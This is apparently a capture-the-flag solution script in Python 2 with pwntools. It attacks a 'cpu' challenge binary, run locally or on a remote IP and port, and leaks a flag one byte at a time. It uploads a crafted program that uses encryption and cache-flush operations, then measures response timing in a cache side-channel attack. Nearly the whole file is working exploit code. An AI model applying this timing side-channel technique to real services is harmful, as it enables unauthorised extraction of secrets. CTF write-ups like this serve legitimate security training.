# python2 sol_cpu.py

from pwn import *
from time import time
from tqdm import tqdm
import disassembler as d

#context.log_level = 'debug'
debug = True

sample_flag = 'bob{s@mplflag}'

def run_encryption(msg):
    s.sendlineafter('> ', '1')
    s.sendafter(': ', msg)

def run_own(program, argv):
    s.sendlineafter('> ', '2')
    s.sendlineafter('(in hex) : ', program.encode('hex'))
    s.sendlineafter('(max: 3)', str(len(argv)))
    for arg in argv:
        s.sendafter(': ', arg)

def cache_attack():

    li = []

    for i in range(0x20, 0x80):
        s.recvuntil('[Register Info]')
        start = time()
        s.recvuntil('[Register Info]')
        end = time()

        if end-start < 0.02:
            return i

def exploit():

    flag = ''

    for i in range(len(sample_flag)):
        print 'processing (%02d/%d)'%(i+1, len(sample_flag))

        payload = '\x00' * i + '\x01'
        payload = payload.ljust(len(sample_flag), '\x00')
        
        program = ''
        program += d._movi(1, 0x20)
        program += d._show_register()
        program += d._mov(2, 1, op=2)
        program += d._show_register()
        program += d._enc(1)
        program += d._movi(0, 0x80)
        program += d._sub(0, 1)
        program += d._jnz(-11)
        program += d._clflush()
        program += d._exit()
        
        run_encryption(payload)
        run_own(program, [])
        
        flag += chr(cache_attack() ^ 0x01)
        print flag

if __name__ == '__main__':
    if debug:
        s = process('./cpu')
        pause()
    else:
        s = remote('3.36.92.16', 9929)
    exploit()
    s.interactive()
    s.close()
